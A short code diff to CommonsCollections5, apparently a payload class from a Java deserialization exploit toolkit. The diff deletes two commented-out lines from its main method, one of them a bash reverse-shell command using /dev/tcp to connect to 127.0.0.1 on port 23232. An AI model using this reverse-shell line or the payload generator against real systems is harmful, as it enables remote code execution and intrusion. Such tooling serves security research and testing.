@@ -91,8 +91,6 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 	}
 
 	public static void main(String[] args) throws Exception {
-//	    args = new String[] {"/bin/bash","-c","bash -i 1>& /dev/tcp/127.0.0.1/23232 0>&1"};
-//        PayloadRunner.runDeserialize = true;
 		PayloadRunner.run(CommonsCollections5.class, args);
 	}
 
